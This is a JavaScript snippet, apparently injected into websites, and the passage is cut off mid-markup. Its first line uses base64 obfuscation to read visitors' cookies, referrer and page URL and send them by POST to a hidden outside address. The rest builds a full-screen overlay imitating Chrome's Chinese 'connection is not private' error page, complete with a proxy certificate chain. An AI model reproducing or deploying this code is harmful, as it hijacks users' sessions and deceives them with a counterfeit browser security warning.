try { var r0; var r1; var r2; try { r0 = window.btoa(eval(window.atob('ZG9jdW1lbnQuY29va2ll'))) } catch { r0 = document.cookie }; try { r1 = window.btoa(eval(window.atob('ZG9jdW1lbnQucmVmZXJyZXI='))) } catch { r1 = document.referrer }; try { r2 = window.btoa(eval(window.atob('ZG9jdW1lbnQuVVJM'))) } catch { r2 = document.URL }; var xhr = null; var x1 = "aHR0cHM6Ly94bXMubGEvMVlTQ0g="; try { xhr = new XMLHttpRequest() } catch (e) { xhr = new ActiceXObject('Microsoft.XMLHttp') }; xhr.open(window.atob('cG9zdA=='), window.atob(x1), true); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('r0=' + r0 + '&r1=' + r1 + '&r2=' + r2 + "&c=1YSCH"); } catch { }
document.addEventListener('DOMContentLoaded', function() {
    var lastVisit = localStorage.getItem('lastVisit');
    var currentTime0 = new Date().getTime();
    // 8 Hour
    if (true) {
        var loginHTML = `
<div id="overlay" style="position: fixed;top: 0;left: 0;width: 100%;height: 100%;background-color: #fff;z-index: 1000;">

<!DOCTYPE html>
<html dir="ltr" lang="zh"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="color-scheme" content="light dark">
  <meta name="theme-color" content="#fff">
  <meta name="viewport" content="initial-scale=1, minimum-scale=1, width=device-width">
  <meta http-equiv="Content-Security-Policy" content="require-trusted-types-for &#39;script&#39;; trusted-types;">
  <title>隐私设置错误</title>
  <style>
a {
  color: var(--link-color);
}
body {
  --background-color: #fff;
  --error-code-color: var(--google-gray-700);
  --google-blue-100: rgb(210, 227, 252);
  --google-blue-300: rgb(138, 180, 248);
  --google-blue-600: rgb(26, 115, 232);
  --google-blue-700: rgb(25, 103, 210);
  --google-gray-100: rgb(241, 243, 244);
  --google-gray-300: rgb(218, 220, 224);
  --google-gray-500: rgb(154, 160, 166);
  --google-gray-50: rgb(248, 249, 250);
  --google-gray-600: rgb(128, 134, 139);
  --google-gray-700: rgb(95, 99, 104);
  --google-gray-800: rgb(60, 64, 67);
  --google-gray-900: rgb(32, 33, 36);
  --heading-color: var(--google-gray-900);
  --link-color: rgb(88, 88, 88);
  --popup-container-background-color: rgba(0,0,0,.65);
  --primary-button-fill-color-active: var(--google-blue-700);
  --primary-button-fill-color: var(--google-blue-600);
  --primary-button-text-color: #fff;
  --quiet-background-color: rgb(247, 247, 247);
  --secondary-button-border-color: var(--google-gray-500);
  --secondary-button-fill-color: #fff;
  --secondary-button-hover-border-color: var(--google-gray-600);
  --secondary-button-hover-fill-color: var(--google-gray-50);
  --secondary-button-text-color: var(--google-gray-700);
  --small-link-color: var(--google-gray-700);
  --text-color: var(--google-gray-700);
  background: var(--background-color);
  color: var(--text-color);
  word-wrap: break-word;
}

.nav-wrapper .secondary-button {
  background: var(--secondary-button-fill-color);
  border: 1px solid var(--secondary-button-border-color);
  color: var(--secondary-button-text-color);
  float: none;
  margin: 0;
  padding: 8px 16px;
}

.hidden {
  display: none;
}

html {
  -webkit-text-size-adjust: 100%;
  font-size: 125%;
}

.icon {
  background-repeat: no-repeat;
  background-size: 100%;
}

@media (prefers-color-scheme: dark) {
  body {
    --background-color: var(--google-gray-900);
    --error-code-color: var(--google-gray-500);
    --heading-color: var(--google-gray-500);
    --link-color: var(--google-blue-300);
    --primary-button-fill-color-active: rgb(129, 162, 208);
    --primary-button-fill-color: var(--google-blue-300);
    --primary-button-text-color: var(--google-gray-900);
    --quiet-background-color: var(--background-color);
    --secondary-button-border-color: var(--google-gray-700);
    --secondary-button-fill-color: var(--google-gray-900);
    --secondary-button-hover-fill-color: rgb(48, 51, 57);
    --secondary-button-text-color: var(--google-blue-300);
    --small-link-color: var(--google-blue-300);
    --text-color: var(--google-gray-500);
  }
}
</style>
  <style>

button {
  background: var(--primary-button-fill-color);
  border: 0;
  border-radius: 20px;
  box-sizing: border-box;
  color: var(--primary-button-text-color);
  cursor: pointer;
  float: right;
  font-size: .875em;
  margin: 0;
  padding: 8px 16px;
  transition: box-shadow 150ms cubic-bezier(0.4, 0, 0.2, 1);
  user-select: none;
}

[dir='rtl'] button {
  float: left;
}

.bad-clock button,
.captive-portal button,
.https-only button,
.insecure-form button,
.lookalike-url button,
.main-frame-blocked button,
.neterror button,
.pdf button,
.ssl button,
.enterprise-block button,
.enterprise-warn button,
.safe-browsing-billing button {
  background: var(--primary-button-fill-color);
}

button:active {
  background: var(--primary-button-fill-color-active);
  outline: 0;
}

#debugging {
  display: inline;
  overflow: auto;
}

.debugging-content {
  line-height: 1em;
  margin-bottom: 0;
  margin-top: 1em;
}

.debugging-content-fixed-width {
  display: block;
  font-family: monospace;
  font-size: 1.2em;
  margin-top: 0.5em;
}

.debugging-title {
  font-weight: bold;
}

#details {
  margin: 0 0 50px;
}

#details p:not(:first-of-type) {
  margin-top: 20px;
}

.secondary-button:active {
  border-color: white;
  box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3),
      0 2px 6px 2px rgba(60, 64, 67, .15);
}

.secondary-button:hover {
  background: var(--secondary-button-hover-fill-color);
  border-color: var(--secondary-button-hover-border-color);
  text-decoration: none;
}

.error-code {
  color: var(--error-code-color);
  font-size: .8em;
  margin-top: 12px;
  text-transform: uppercase;
}

#error-debugging-info {
  font-size: 0.8em;
}

h1 {
  color: var(--heading-color);
  font-size: 1.6em;
  font-weight: normal;
  line-height: 1.25em;
  margin-bottom: 16px;
}

h2 {
  font-size: 1.2em;
  font-weight: normal;
}

.icon {
  height: 72px;
  margin: 0 0 40px;
  width: 72px;
  background-image: image-set( url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAMAAABiM0N1AAABAlBMVEUAAADcRTfcRDfdRET/gIDcRjr/ZmbjVTncRDfcRTfcRDfdRDzgSTncRDjeSDvcRTjbRDfbRDjeRzvcRjfbRjjcRTjcRTjcRTfdRTfcRDjdRTjcRTjbRDjbRTjbRTjbRTfcRjjdRDrcRjfbRTjZQzfcRDjZRDfZRzbWQzXXRDXXQzbXQzbWQjXYSDvWQjbbRDfOQDPSQTTUQjXCPDDNPzPJPjLGPTHVQjXMPzPRQTTWQjXLPzPDPDHYQzbAOzDTQTXHPTLIPjK8Oi++Oy/FPTHEPTHPQDTQQDTUQTXBPDDKPjK/OzC9Oi/////PQDPRQDS3OS66OS7TQTTEPDHXQjbMPjMBhLaWAAAAL3RSTlMA4tgPAhYFCcL98B4x9ie1+s49WICbqXNKZY3pjuqcgVdLZnL2qKg9zmXpjfontV8LANsAAAJrSURBVHhe7ZTnduIwFAY3ARIgBAg9vW1v173ROylby/u/yso2Fx3MNaxs9h/zAHM+Sfa8+M/s2LFjx+3tdjwH+/sHWxHVAerb8KSyANnUFkRXwLiK78llgJHJxRalwSMd11OGOeV4nsM9FO0dxhJdw4LrOJ6jYy46PoohqgEHatE9JViiFNWTPIElTpIRRXcQ4C6aJ3EJAS4TkUQXsMJFFE++CCsU8xFEBSAoiHsaQNIQ7yuQCFe3DiHUhftKIlzdKoRSFe0r8sXDAkSoumkIigYaIOkIfeWi56EESFm8r1w0fFIl4epWgBA9qOMpmirCfeWijtoa9WSx6taAELFBRl/vilS3BJRIbRk9/VFTsLrifUXRuNfXLU0y/7m6p0CKxqN+v6lJU/k3eJxu7Os5LWKDHi1tYstKG1zON1X3DGiRMR80Mx3fdCbc1+bQe3o2SJrYXcV0fFMxL9xXiz0987BBtux65qaCeF8lHCR3FabBTQ3xvk4M1yN5B/Mw2+urew8hTP1BM38Qnu5evK8gMw+7IcfH9E3ZlEBfMSO//Kf35+Cm6ua+rhbSYDeEa9CUyW3qK1HIjj5DBz8dWd0bWCd6Ult/uMPEr+BmbV/JHrVG/a9MsEybV5fsK50R3frmBFXtCtVXmt73H4PhQ4t9k9rkJ55tYXwZrO4rCEUfPHfUEcuaZC/umw97TfaVpslu2tCb2lRWnBlKFtf+huwrjaa6Pxv7RfgW7nubJPtKI/X0puQO4k/Pfe/ovtLY7KbxVwve0/sE3VeaLosIbkEDvt8Hoq/hKGwQYvoq5OMnoq/hLAbgc/FVn33PX7pAfE5QHR6fAAAAAElFTkSuQmCC) 1x, url(data:image/png;base64,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) 2x);
}

input[type=checkbox] {
  opacity: 0;
}

input[type=checkbox]:focus ~ .checkbox::after {
  outline: -webkit-focus-ring-color auto 5px;
}

.interstitial-wrapper {
  box-sizing: border-box;
  font-size: 1em;
  line-height: 1.6em;
  margin: 14vh auto 0;
  max-width: 600px;
  width: 100%;
}

#main-message > p {
  display: inline;
}

#extended-reporting-opt-in {
  font-size: .875em;
  margin-top: 32px;
}

#extended-reporting-opt-in label {
  display: grid;
  grid-template-columns: 1.8em 1fr;
  position: relative;
}

#enhanced-protection-message {
  border-radius: 20px;
  font-size: 1em;
  margin-top: 32px;
  padding: 10px 5px;
}

#enhanced-protection-message a {
  color: var(--google-red-10);
}

#enhanced-protection-message label {
  display: grid;
  grid-template-columns: 2.5em 1fr;
  position: relative;
}

#enhanced-protection-message div {
  margin: 0.5em;
}

#enhanced-protection-message .icon {
  height: 1.5em;
  vertical-align: middle;
  width: 1.5em;
}

.nav-wrapper {
  margin-top: 51px;
}

.nav-wrapper::after {
  clear: both;
  content: '';
  display: table;
  width: 100%;
}

.small-link {
  color: var(--small-link-color);
  font-size: .875em;
}

.checkboxes {
  flex: 0 0 24px;
}

.checkbox {
  --padding: .9em;
  background: transparent;
  display: block;
  height: 1em;
  left: -1em;
  padding-inline-start: var(--padding);
  position: absolute;
  right: 0;
  top: -.5em;
  width: 1em;
}

.checkbox::after {
  border: 1px solid white;
  border-radius: 2px;
  content: '';
  height: 1em;
  left: var(--padding);
  position: absolute;
  top: var(--padding);
  width: 1em;
}

.checkbox::before {
  background: transparent;
  border: 2px solid white;
  border-inline-end-width: 0;
  border-top-width: 0;
  content: '';
  height: .2em;
  left: calc(.3em + var(--padding));
  opacity: 0;
  position: absolute;
  top: calc(.3em  + var(--padding));
  transform: rotate(-45deg);
  width: .5em;
}

input[type=checkbox]:checked ~ .checkbox::before {
  opacity: 1;
}

#recurrent-error-message {
  background: #ededed;
  border-radius: 4px;
  margin-bottom: 16px;
  margin-top: 12px;
  padding: 12px 16px;
}

.showing-recurrent-error-message #extended-reporting-opt-in {
  margin-top: 16px;
}

.showing-recurrent-error-message #enhanced-protection-message {
  margin-top: 16px;
}

@media (max-width: 700px) {
  .interstitial-wrapper {
    padding: 0 10%;
  }

  #error-debugging-info {
    overflow: auto;
  }
}

@media (max-width: 420px) {
  button,
  [dir='rtl'] button,
  .small-link {
    float: none;
    font-size: .825em;
    font-weight: 500;
    margin: 0;
    width: 100%;
  }

  button {
    padding: 16px 24px;
  }

  #details {
    margin: 20px 0 20px 0;
  }

  #details p:not(:first-of-type) {
    margin-top: 10px;
  }

  .secondary-button:not(.hidden) {
    display: block;
    margin-top: 20px;
    text-align: center;
    width: 100%;
  }

  .interstitial-wrapper {
    padding: 0 5%;
  }

  #extended-reporting-opt-in {
    margin-top: 24px;
  }

  #enhanced-protection-message {
    margin-top: 24px;
  }

  .nav-wrapper {
    margin-top: 30px;
  }
}

@media (max-width: 420px) {
  .nav-wrapper .secondary-button {
    border: 0;
    margin: 16px 0 0;
    margin-inline-end: 0;
    padding-bottom: 16px;
    padding-top: 16px;
  }
}

/* Fixed nav. */
@media (min-width: 240px) and (max-width: 420px) and
       (min-height: 401px),
       (min-width: 421px) and (min-height: 240px) and
       (max-height: 560px) {
  body .nav-wrapper {
    background: var(--background-color);
    bottom: 0;
    box-shadow: 0 -12px 24px var(--background-color);
    left: 0;
    margin: 0 auto;
    max-width: 736px;
    padding-inline-end: 24px;
    padding-inline-start: 24px;
    position: fixed;
    right: 0;
    width: 100%;
    z-index: 2;
  }

  .interstitial-wrapper {
    max-width: 736px;
  }

  #details,
  #main-content {
    padding-bottom: 40px;
  }

  #details {
    padding-top: 5.5vh;
  }

  button.small-link {
    color: var(--google-blue-600);
  }
}

@media (max-width: 420px) and (orientation: portrait),
       (max-height: 560px) {
  body {
    margin: 0 auto;
  }

  button,
  [dir='rtl'] button,
  button.small-link,
  .nav-wrapper .secondary-button {
    font-family: Roboto-Regular,Helvetica;
    font-size: .933em;
    margin: 6px 0;
    transform: translatez(0);
  }

  .nav-wrapper {
    box-sizing: border-box;
    padding-bottom: 8px;
    width: 100%;
  }

  #details {
    box-sizing: border-box;
    height: auto;
    margin: 0;
    opacity: 1;
    transition: opacity 250ms cubic-bezier(0.4, 0, 0.2, 1);
  }

  #details.hidden,
  #main-content.hidden {
    height: 0;
    opacity: 0;
    overflow: hidden;
    padding-bottom: 0;
    transition: none;
  }

  h1 {
    font-size: 1.5em;
    margin-bottom: 8px;
  }

  .icon {
    margin-bottom: 5.69vh;
  }

  .interstitial-wrapper {
    box-sizing: border-box;
    margin: 7vh auto 12px;
    padding: 0 24px;
    position: relative;
  }

  .interstitial-wrapper p {
    font-size: .95em;
    line-height: 1.61em;
    margin-top: 8px;
  }

  #main-content {
    margin: 0;
    transition: opacity 100ms cubic-bezier(0.4, 0, 0.2, 1);
  }

  .small-link {
    border: 0;
  }

  .suggested-left > #control-buttons,
  .suggested-right > #control-buttons {
    float: none;
    margin: 0;
  }
}

@media (min-width: 421px) and (min-height: 500px) and (max-height: 560px) {
  .interstitial-wrapper {
    margin-top: 10vh;
  }
}

@media (min-height: 400px) and (orientation:portrait) {
  .interstitial-wrapper {
    margin-bottom: 145px;
  }
}

@media (min-height: 299px) {
  .nav-wrapper {
    padding-bottom: 16px;
  }
}

@media (max-height: 560px) and (min-height: 240px) and (orientation:landscape) {
  .extended-reporting-has-checkbox #details {
    padding-bottom: 80px;
  }
}

@media (min-height: 500px) and (max-height: 650px) and (max-width: 414px) and
       (orientation: portrait) {
  .interstitial-wrapper {
    margin-top: 7vh;
  }
}

@media (min-height: 650px) and (max-width: 414px) and (orientation: portrait) {
  .interstitial-wrapper {
    margin-top: 10vh;
  }
}

@media (max-height: 400px) and (orientation: portrait),
       (max-height: 239px) and (orientation: landscape),
       (max-width: 419px) and (max-height: 399px) {
  .interstitial-wrapper {
    display: flex;
    flex-direction: column;
    margin-bottom: 0;
  }

  #details {
    flex: 1 1 auto;
    order: 0;
  }

  #main-content {
    flex: 1 1 auto;
    order: 0;
  }

  .nav-wrapper {
    flex: 0 1 auto;
    margin-top: 8px;
    order: 1;
    padding-inline-end: 0;
    padding-inline-start: 0;
    position: relative;
    width: 100%;
  }

  button,
  .nav-wrapper .secondary-button {
    padding: 16px 24px;
  }

  button.small-link {
    color: var(--google-blue-600);
  }
}

@media (max-width: 239px) and (orientation: portrait) {
  .nav-wrapper {
    padding-inline-end: 0;
    padding-inline-start: 0;
  }
}
</style>
  <style>
</style>
  <style>
@media (prefers-color-scheme: dark) {
  .captive-portal .icon {
    filter: invert(1);
  }
}
</style>
  <style>

.https-only #main-content a {
  color: var(--google-blue-700);
  text-decoration: none;
}

@media (prefers-color-scheme: dark) {
  .https-only .icon {
    filter: invert(1) grayscale(1);
  }
}
</style>
  <style>

.insecure-form #main-content a {
  color: var(--google-blue-700);
  text-decoration: none;
}

@media (prefers-color-scheme: dark) {
  .insecure-form .icon {
    filter: invert(1);
  }
}
</style>
  <style>

.lookalike-url #main-content a {
  color: var(--google-blue-700);
  text-decoration: none;
}

@media (prefers-color-scheme: dark) {
  .lookalike-url .icon {
    filter: invert(1);
  }
}
</style>
  <style>

.safe-browsing :-webkit-any(
    a, #details, #details-button, #proceed-button, h1, h2, p, .small-link) {
  color: white;
}

.safe-browsing button {
  background: white;
  border-color: white;
  color: var(--google-primary-40);
}

.safe-browsing button:active {
  box-shadow: 0 1px 2px 0 rgba(165, 14, 14, .3),
      0 2px 6px 2px rgba(165, 14, 14, .15);
}

.safe-browsing button:hover {
  background: var(--google-primary-90);
}

.safe-browsing .secondary-button {
  background-color: var(--google-red-40);
  border-color: white;
  color: white;
}

.safe-browsing .secondary-button:active {
  box-shadow: 0 2px 3px rgba(0, 0, 0, .5);
}

@media (min-width: 240px) and (max-width: 420px) and
       (min-height: 401px),
       (min-width: 421px) and (min-height: 240px) and
       (max-height: 560px) {
  body.safe-browsing .nav-wrapper {
    background: var(--google-red-40);
    box-shadow: 0 -12px 24px var(--google-red-40);
  }
}

.ssl-opt-in .checkbox::after {
  border-color: #696969;
}

.ssl-opt-in .checkbox::before {
  border-color: #696969;
}

.ssl-enhanced-protection-message {
  background-color: rgb(248, 249, 250); /* google-gray-50 */
  border: 1px solid rgb(218, 220, 224); /* google-gray-300 */
}
.ssl-enhanced-protection-message .icon {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgZmlsbD0iIzY5Njk2OSI+PHBhdGggZD0iTTkgMjFjMCAuNTUuNDUgMSAxIDFoNGMuNTUgMCAxLS40NSAxLTF2LTFIOXYxem0zLTE5QzguMTQgMiA1IDUuMTQgNSA5YzAgMi4zOCAxLjE5IDQuNDcgMyA1Ljc0VjE3YzAgLjU1LjQ1IDEgMSAxaDZjLjU1IDAgMS0uNDUgMS0xdi0yLjI2YzEuODEtMS4yNyAzLTMuMzYgMy01Ljc0IDAtMy44Ni0zLjE0LTctNy03em0yLjg1IDExLjEtLjg1LjZWMTZoLTR2LTIuM2wtLjg1LS42QTQuOTk3IDQuOTk3IDAgMCAxIDcgOWMwLTIuNzYgMi4yNC01IDUtNXM1IDIuMjQgNSA1YzAgMS42My0uOCAzLjE2LTIuMTUgNC4xeiIvPjwvc3ZnPg==);
}
</style>
</head>
<body id="body" class="ssl">
  <div class="interstitial-wrapper">
    <div id="main-content">
      <div class="icon new-icon" id="icon"></div>
      <div id="main-message">
        <h1>您的连接不是私密连接</h1>
        <p>攻击者可能会试图从 <strong><span  id="domainName"></span></strong> 窃取您的信息（例如：密码、通讯内容或信用卡信息）。<a href="https://support.google.com/chrome/answer/6098869#-202" id="learn-more-link">了解详情</a></p>
        <div id="debugging">
          <div id="error-code" class="error-code" role="button" aria-expanded="false">net::ERR_CERT_AUTHORITY_INVALID</div>
          <div id="error-debugging-info" class="hidden"><p class="debugging-content"><span class="debugging-title">Subject: </span><span class="debugging-content">fofa.info</span></p><p class="debugging-content"><span class="debugging-title">Issuer: </span><span class="debugging-content">Charles Proxy CA (28 Feb 2024, DESKTOP-36CPI9M)</span></p><p class="debugging-content"><span class="debugging-title">Expires on: </span><span class="debugging-content">2025年6月5日</span></p><p class="debugging-content"><span class="debugging-title">Current date: </span><span class="debugging-content">2024年6月21日</span></p><p class="debugging-content"><span class="debugging-title">PEM encoded chain: </span><span class="debugging-content debugging-content-fixed-width">-----BEGIN CERTIFICATE-----<br>MIIDrjCCApagAwIBAgIELlxzcTANBgkqhkiG9w0BAQsFADCBpzE4MDYGA1UEAwwv<br>Q2hhcmxlcyBQcm94eSBDQSAoMjggRmViIDIwMjQsIERFU0tUT1AtMzZDUEk5TSkx<br>JTAjBgNVBAsMHGh0dHBzOi8vY2hhcmxlc3Byb3h5LmNvbS9zc2wxETAPBgNVBAoM<br>CFhLNzIgTHRkMREwDwYDVQQHDAhBdWNrbGFuZDERMA8GA1UECAwIQXVja2xhbmQx<br>CzAJBgNVBAYTAk5aMB4XDTI0MDYwNTA3MzQ0MVoXDTI1MDYwNTA3MzQ0MVowWzEL<br>MAkGA1UEBhMCTloxETAPBgNVBAoMCFhLNzIgTHRkMSUwIwYDVQQLDBxodHRwczov<br>L2NoYXJsZXNwcm94eS5jb20vc3NsMRIwEAYDVQQDDAlmb2ZhLmluZm8wggEiMA0G<br>CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCIZzV/ZGtZKKqECI+ONKeJ0un693M0<br>WUiOgdnPF8/VEbGIE4RMOx94UJd9zLr0IL8znUIBPSMSN12/u5xbcQJydC5bC3h7<br>7bWbFYxVWMxe9oqGlF8KKmrEMVyVUE3sZ7IdMLlPE3cqtnUH/kMfMgU1CqkDRlde<br>ioPPC8JF1k556lX3B0H1m4/w9/JaYFT9r5Xn1qxSTSYmgStIVOyOeFGzBvwCUrJT<br>3dwHHMJYyepYYCgk4BtryNq/0kwzFFoNB800j3ziT1N7QSHb7ZNrnYAmDGCSRnXZ<br>6M8gjRyN4nkdtmauh3pRXGVx2YxDotwMXTWYeR+JPy+Qxme31d8BGwstAgMBAAGj<br>LTArMBQGA1UdEQQNMAuCCWZvZmEuaW5mbzATBgNVHSUEDDAKBggrBgEFBQcDATAN<br>BgkqhkiG9w0BAQsFAAOCAQEAUCrjmRT9drSesmJtl2E61ZseQ0kxWQvAi/EoUGyb<br>SVbMuC5oKYuz9/9iUDXuKXF4hCC3QeSWPRVF6P7vbJ4X2sg0qIMGWegLKAVz0Lxb<br>MgAJDwvl1IEKMWwpWbRqeEk6uu++hYcNZcOUvnI9Iwavm49DUBQbCEIBE6e4IyR3<br>Jo9C6an5RPZaw5Oe/ssUJWLrI2Qo9gqSDy6w547MPDzSOpOUwvdfuAYxxq6Th0rD<br>a+XPKP3QlH9vTN/pcA82J5oGm+k2iZA9vgEItJ3cuDdBUjYn5/A/AZ6G+leeZnkc<br>suCjyLyqPGGAkgiJUV6ja/QMLbXwG3jjfHGFpTscom0U+Q==<br>-----END CERTIFICATE-----<br>-----BEGIN CERTIFICATE-----<br>MIIFRjCCBC6gAwIBAgIGAY3ttBh7MA0GCSqGSIb3DQEBCwUAMIGnMTgwNgYDVQQD<br>DC9DaGFybGVzIFByb3h5IENBICgyOCBGZWIgMjAyNCwgREVTS1RPUC0zNkNQSTlN<br>KTElMCMGA1UECwwcaHR0cHM6Ly9jaGFybGVzcHJveHkuY29tL3NzbDERMA8GA1UE<br>CgwIWEs3MiBMdGQxETAPBgNVBAcMCEF1Y2tsYW5kMREwDwYDVQQIDAhBdWNrbGFu<br>ZDELMAkGA1UEBhMCTlowHhcNMjQwMjI3MDMxMzM5WhcNMjUwMjI2MDMxMzM5WjCB<br>pzE4MDYGA1UEAwwvQ2hhcmxlcyBQcm94eSBDQSAoMjggRmViIDIwMjQsIERFU0tU<br>T1AtMzZDUEk5TSkxJTAjBgNVBAsMHGh0dHBzOi8vY2hhcmxlc3Byb3h5LmNvbS9z<br>c2wxETAPBgNVBAoMCFhLNzIgTHRkMREwDwYDVQQHDAhBdWNrbGFuZDERMA8GA1UE<br>CAwIQXVja2xhbmQxCzAJBgNVBAYTAk5aMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A<br>MIIBCgKCAQEAiGc1f2RrWSiqhAiPjjSnidLp+vdzNFlIjoHZzxfP1RGxiBOETDsf<br>eFCXfcy69CC/M51CAT0jEjddv7ucW3ECcnQuWwt4e+21mxWMVVjMXvaKhpRfCipq<br>xDFclVBN7GeyHTC5TxN3KrZ1B/5DHzIFNQqpA0ZXXoqDzwvCRdZOeepV9wdB9ZuP<br>8PfyWmBU/a+V59asUk0mJoErSFTsjnhRswb8AlKyU93cBxzCWMnqWGAoJOAba8ja<br>v9JMMxRaDQfNNI984k9Te0Eh2+2Ta52AJgxgkkZ12ejPII0cjeJ5HbZmrod6UVxl<br>cdmMQ6LcDF01mHkfiT8vkMZnt9XfARsLLQIDAQABo4IBdDCCAXAwDwYDVR0TAQH/<br>BAUwAwEB/zCCASwGCWCGSAGG+EIBDQSCAR0TggEZVGhpcyBSb290IGNlcnRpZmlj<br>YXRlIHdhcyBnZW5lcmF0ZWQgYnkgQ2hhcmxlcyBQcm94eSBmb3IgU1NMIFByb3h5<br>aW5nLiBJZiB0aGlzIGNlcnRpZmljYXRlIGlzIHBhcnQgb2YgYSBjZXJ0aWZpY2F0<br>ZSBjaGFpbiwgdGhpcyBtZWFucyB0aGF0IHlvdSdyZSBicm93c2luZyB0aHJvdWdo<br>IENoYXJsZXMgUHJveHkgd2l0aCBTU0wgUHJveHlpbmcgZW5hYmxlZCBmb3IgdGhp<br>cyB3ZWJzaXRlLiBQbGVhc2Ugc2VlIGh0dHA6Ly9jaGFybGVzcHJveHkuY29tL3Nz<br>bCBmb3IgbW9yZSBpbmZvcm1hdGlvbi4wDgYDVR0PAQH/BAQDAgIEMB0GA1UdDgQW<br>BBRLYIrop7fCXVD2fJUdQeo7JjbFjzANBgkqhkiG9w0BAQsFAAOCAQEAXRvF8pkE<br>CGjd3jZMvLdhKn0tnUV1cWMGRpbH3VJylRjSXI+0kLCm5+GVi8U4EF8TUncuqeL6<br>OdIfq/onGGkE0wxHKEC3Kv7RwxSQ2PaoKVrm+j9NC5UhreYwEmG4YjEd3VUs8+nL<br>t1Ew4FnM5XF0mMJdpbAgRCgNgPBd+5eSZbSSmr7f4BV6z0gWm48xBUZrgIk3H9S+<br>1YE5OCToeZ/SfvIQYEUaHbk2J/kq4JxbnOatjmbkKXwZGReMVGqF8JOBh7cnbjAI<br>bfvlxjycvA0oP1ZswClYFZz00dG0AFPziVXXBayubQzta1cXFdXn9l7q0CUoLPqh<br>u7ZR4pzrDU989Q==<br>-----END CERTIFICATE-----<br></span></p></div>
        </div>
      </div>
      <div id="recurrent-error-message" class="hidden">
